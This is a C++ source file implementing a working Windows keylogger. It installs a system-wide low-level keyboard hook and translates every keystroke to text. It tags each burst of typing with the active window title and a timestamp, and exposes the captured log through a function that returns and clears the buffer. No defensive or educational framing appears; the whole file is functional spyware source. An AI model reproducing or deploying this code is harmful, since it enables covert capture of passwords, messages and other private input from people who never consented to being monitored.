#include "Keylogger.h"
#include <windows.h>
#include <vector>
#include <mutex>
#include <thread>
#include <ctime>
#include <sstream>

namespace capture {

    namespace {
        HHOOK hHook = NULL;
        std::mutex logMutex;
        std::string keylogBuffer;
        std::thread loggerThread;
        std::atomic<bool> isLogging{false};
        std::string lastTitle;
        DWORD loggerThreadId = 0;

        std::string GetActiveWindowTitle() {
            char title[256];
            HWND hwnd = GetForegroundWindow();
            if (hwnd) {
                GetWindowTextA(hwnd, title, sizeof(title));
                return std::string(title);
            }
            return "Unknown Window";
        }

        LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
            if (nCode >= 0 && wParam == WM_KEYDOWN) {
                KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
                
                std::lock_guard<std::mutex> lock(logMutex);

                // 1. Check title change
                std::string currentTitle = GetActiveWindowTitle();
                if (currentTitle != lastTitle) {
                    lastTitle = currentTitle;
                    
                    time_t now = time(0);
                    char dt[26];
                    ctime_s(dt, sizeof(dt), &now);
                    std::string timestamp = dt;
                    if (!timestamp.empty() && timestamp.back() == '\n') timestamp.pop_back();

                    keylogBuffer += "\n\n--- [Active Window: " + currentTitle + " at " + timestamp + "] ---\n";
                }

                // 2. Map Virtual Key to char
                DWORD vkCode = kbd->vkCode;
                
                if (vkCode == VK_RETURN) keylogBuffer += "[ENTER]\n";
                else if (vkCode == VK_BACK) keylogBuffer += "[BACKSPACE]";
                else if (vkCode == VK_SPACE) keylogBuffer += " ";
                else if (vkCode == VK_TAB) keylogBuffer += "[TAB]";
                else if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {} 
                else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) keylogBuffer += "[CTRL]";
                else if (vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) keylogBuffer += "[ALT]";
                else if (vkCode == VK_CAPITAL) keylogBuffer += "[CAPS]";
                else if (vkCode == VK_ESCAPE) keylogBuffer += "[ESC]";
                else {
                    // Robust translation using ToUnicode
                    BYTE keyboardState[256] = {0};
                    
                    // In a low-level hook, GetKeyboardState doesn't work for modifiers.
                    // We must manually populate it using GetKeyState.
                    if (GetKeyState(VK_SHIFT) & 0x8000) keyboardState[VK_SHIFT] = 0x80;
                    if (GetKeyState(VK_CONTROL) & 0x8000) keyboardState[VK_CONTROL] = 0x80;
                    if (GetKeyState(VK_MENU) & 0x8000) keyboardState[VK_MENU] = 0x80;
                    if (GetKeyState(VK_CAPITAL) & 0x01) keyboardState[VK_CAPITAL] = 0x01;

                    WCHAR unicodeChar[5] = {0};
                    int result = ToUnicode(vkCode, kbd->scanCode, keyboardState, unicodeChar, 4, 0);
                    
                    if (result > 0) {
                        // Successfully mapped to unicode character
                        // Convert to UTF-8
                        char utf8[10] = {0};
                        int len = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, utf8, sizeof(utf8), NULL, NULL);
                        if (len > 0) {
                            keylogBuffer += std::string(utf8, len);
                        }
                    } else {
                        // Fallback to key name
                        char keyName[64] = {0};
                        if (GetKeyNameTextA(kbd->scanCode << 16, keyName, sizeof(keyName))) {
                            keylogBuffer += "[" + std::string(keyName) + "]";
                        }
                    }
                }
            }
            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        void LoggerLoop() {
            loggerThreadId = GetCurrentThreadId();
            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
            if (!hHook) {
                isLogging = false;
                return;
            }
            
            MSG msg;
            while (isLogging) {
                // Use PeekMessage to allow non-blocking check of isLogging
                if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                    if (msg.message == WM_QUIT) break;
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                } else {
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                }
            }
            
            UnhookWindowsHookEx(hHook);
            hHook = NULL;
            loggerThreadId = 0;
        }
    }

    void StartKeylogger() {
        if (isLogging) return;
        isLogging = true;
        loggerThread = std::thread(LoggerLoop);
        loggerThread.detach(); 
    }

    void StopKeylogger() {
        if (!isLogging) return;
        isLogging = false;
        if (loggerThreadId != 0) {
            PostThreadMessage(loggerThreadId, WM_QUIT, 0, 0);
        }
    }

    std::string GetAndClearKeylog() {
        std::lock_guard<std::mutex> lock(logMutex);
        if (keylogBuffer.empty()) return "[NO LOGS]";
        std::string logs = keylogBuffer;
        keylogBuffer.clear();
        return logs;
    }

}
